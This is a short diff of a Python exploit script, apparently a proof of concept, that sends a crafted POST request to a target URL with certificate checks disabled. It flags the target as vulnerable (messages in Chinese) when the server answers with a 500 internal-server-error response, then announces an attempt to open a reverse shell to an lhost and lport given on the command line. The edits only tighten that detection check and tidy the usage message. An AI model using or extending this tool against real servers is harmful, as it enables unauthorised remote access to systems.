@@ -1,6 +1,5 @@
 import requests
 import sys
-import threading
 import base64
 import urllib3
 urllib3.disable_warnings()
@@ -49,7 +48,10 @@ def bash(url,ip,port):
     try:
         req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
         code =req.status_code
-        if code == 500:
+        text = req.text
+        rsp = '"error":"Internal Server Error"'
+
+        if code == 500 and rsp in text:
             print(f'[+]{url} 存在漏洞')
             print('正在尝试反弹shell...')
         else:
@@ -71,6 +73,6 @@ if __name__ == '__main__' :
         cmd3 =sys.argv[3]
         bash(cmd1,cmd2,cmd3)
     except:
-        print('用法')
+        print('用法：')
         print('python demo.py url lhost lport')
         pass
